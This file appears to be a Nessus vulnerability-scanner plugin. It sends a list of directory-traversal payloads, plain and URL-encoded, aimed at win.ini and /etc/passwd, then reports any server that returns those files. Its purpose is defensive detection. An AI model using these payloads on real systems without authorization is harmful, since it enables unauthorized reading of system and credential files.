#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# And hacked three years later by Michel Arboi...
#
# See the Nessus Scripts License for details
#
##############
# References:
##############
#
# Date: 25 Sep 2002 09:10:45 -0000
# Message-ID: <20020925091045.29313.qmail@mail.securityfocus.com>
# From: "DownBload" <downbload@hotmail.com>
# To: bugtraq@securityfocus.com
# Subject: IIL Advisory: Reverse traversal vulnerability in Monkey (0.1.4) HTTP server
#
# From: "David Endler" <dendler@idefense.com>
# To:vulnwatch@vulnwatch.org
# Date: Mon, 23 Sep 2002 16:41:19 -0400
# Subject: iDEFENSE Security Advisory 09.23.2002: Directory Traversal in Dino's Webserver
#
# From:"UkR security team^(TM)" <cuctema@ok.ru>
# Subject: advisory
# To: bugtraq@securityfocus.com
# Date: Thu, 05 Sep 2002 16:30:30 +0400
# Message-ID: <web-29288022@backend2.aha.ru>
#
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Web Server 4D/eCommerce 3.5.3 Directory Traversal Vulnerability
# Date: Tue, 15 Jan 2002 00:36:26 +0200
# Affiliation: http://www.securityoffice.net
#
# From: "Alex Forkosh" <aforkosh@techie.com>
# To: bugtraq@securityfocus.com
# Subject: Viewing arbitrary file from the file system using Eshare Expressions 4 server
# Date: Tue, 5 Feb 2002 00:18:42 -0600
#
# Should also apply for BID 7308, 7378, 7362, 7544, 7715
#
# From:	"scrap" <webmaster@securiteinfo.com>
# To:	vulnwatch@vulnwatch.org
# Date:	Thu, 25 Sep 2003 23:19:34 +0200
# Subject: myServer 0.4.3 Directory Traversal Vulnerability
#
# http://www.zone-h.org/en/advisories/read/id=3645/
# http://aluigi.altervista.org/adv/dcam-adv.txt
#

if(description)
{
 script_id(10297);
 script_version ("$Revision: 1.40 $");

 name["english"] = "Web server traversal";
 script_name(english:name["english"]);

 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending ../../
or ..\..\ in front on the file name.

Solution : Use another web server

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "\..\..\file.txt";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

i=0;
r[i] = string("..\\..\\..\\..\\..\\..\\windows\\win.ini");	i=i+1;
r[i] = string("..\\..\\..\\..\\..\\..\\winnt\\win.ini");	i=i+1;
r[i] = "/%5c..%5c..%5c..%5cwindows%5cwin.ini";		i=i+1;
r[i] = "/%5c..%5c..%5c..%5cwindows%5cwin%2eini";	i=i+1;
r[i] = "/%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini";	i=i+1;
r[i] = "/%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini";	i=i+1;
r[i] = string("/.|./.|./.|./.|./.|./.|./.|./winnt/win.ini");	i=i+1;
r[i] = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini"); i=i+1;
r[i] = string("/.../.../.../.../.../.../.../.../.../winnt/win.ini"); i=i+1;
r[i] = string("/././././././../../../../../winnt/win.ini"); i=i+1;
r[i] = ".\.\.\.\.\.\.\.\.\.\/windows/win.ini"; i=i+1;
r[i] = string("/nessus\\..\\..\\..\\..\\..\\..\\windows\\win.ini");	i=i+1;
r[i] = string("/nessus\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");	i=i+1;
r[i] = 0;

for (i=0; r[i]; i=i+1)
{
  if (check_win_dir_trav_ka(port: port, url: r[i]))
  {
    req = http_get(item: r[i], port:port);
    rc = http_keepalive_send_recv(port:port, data:req);
    encaps = get_port_transport(port);
    if ( encaps >= ENCAPS_SSLv2 ) 
    exploit_url = string("https://", get_host_ip(), ":", port, r[i]);
   else
    exploit_url = string("http://", get_host_ip(), ":", port, r[i]);

   report = "
It is possible to read arbitrary files on
the remote server by prepending ../../
or ..\..\ in front on the file name.

It was possible to read arbitrary files using the URL : 
" + exploit_url + "

Which produces : 
" + rc + "

Solution : Use another web server
Risk factor : High";
    security_hole(port:port, data:report);
    exit(0);
  }
}

i=0;
r[i] = "../../../../../../etc/passwd";		i=i+1;
r[i] = "/../../../../../../../../../etc/passwd";	i=i+1;
r[i] = "//../../../../../../../../../etc/passwd";	i=i+1;
r[i] = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"); i=i+1;
r[i] = "/././././././../../../../../etc/passwd";		i=i+1;
r[i] = 0;

for (i = 0; r[i]; i=i+1)
{
  req = http_get(item: r[i], port:port);
  rc = http_keepalive_send_recv(port:port, data:req);
  if(rc == NULL ) exit(0);
  if(egrep(pattern:"root:.*:0:[01]:", string:rc))
  {
   exploit_url = string("http://", get_host_ip(), ":", port, "/", r[i]);
   report = "
It is possible to read arbitrary files on
the remote server by prepending ../../
or ..\..\ in front on the file name.

It was possible to read arbitrary files using the URL : 
" + exploit_url + "

Which produces : 
" + rc + "

Solution : Use another web server
Risk factor : High";
    
    security_hole(port:port, data:report);
    exit(0);
  }
}

